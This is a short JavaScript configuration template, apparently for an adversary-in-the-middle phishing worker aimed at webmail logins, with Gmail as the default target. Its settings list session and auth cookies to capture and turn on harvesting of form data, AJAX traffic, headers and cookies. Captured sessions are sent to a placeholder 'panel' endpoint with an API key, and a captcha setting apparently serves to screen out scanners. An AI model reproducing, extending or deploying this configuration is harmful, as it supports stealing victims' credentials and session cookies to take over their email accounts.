// File: worker/config/worker-config.js
// This is a template - values are injected at deploy time

const CONFIG = {
    provider: 'google',  // or 'outlook', 'yahoo', 'custom'
    targetUrl: 'https://mail.google.com',
    panelEndpoint: 'https://your-panel.com/api/sessions/import',
    apiKey: 'your-api-key',
    
    // For custom providers
    loginPath: '/login',
    dashboardPath: '/mail',
    authCookies: ['session', 'token', 'auth'],
    
    // Captcha settings (optional)
    captchaEnabled: true,
    captchaType: 'math',  // or 'custom'
    
    // Session capture settings
    captureForms: true,
    captureAjax: true,
    captureHeaders: true,
    captureCookies: true,
};